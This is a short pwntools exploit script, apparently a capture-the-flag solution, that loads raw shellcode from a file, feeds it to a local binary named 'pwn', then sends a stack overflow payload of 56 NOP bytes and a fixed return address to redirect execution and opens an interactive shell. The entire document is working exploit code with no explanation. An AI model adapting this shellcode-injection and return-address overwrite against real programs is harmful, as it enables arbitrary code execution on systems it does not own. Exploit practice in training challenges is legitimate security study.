from pwn import *

shellcode = b""
buffer = []
with open("./shellcode-raw", "rb") as f:
    buffer = f.readlines()
for line in buffer:
    shellcode += line

print("[+] Shellcode: ", shellcode)
print()
print("[+] Shellcode Length: ", len(shellcode))

payload = b""
payload += b"\x90" * 56
payload += p64(0x21f2b000)

p = process("./pwn")

res = p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.\n")
print(res)

p.sendline(shellcode)

res = p.recvuntil(b"Press enter to continue!")
print(res)

p.sendline()

res = p.recvuntil(b"Send your payload (up to 4096 bytes)!\n")
print(res)

p.send(payload)

p.interactive()

with open("payload", "wb") as f:
    f.write(payload)
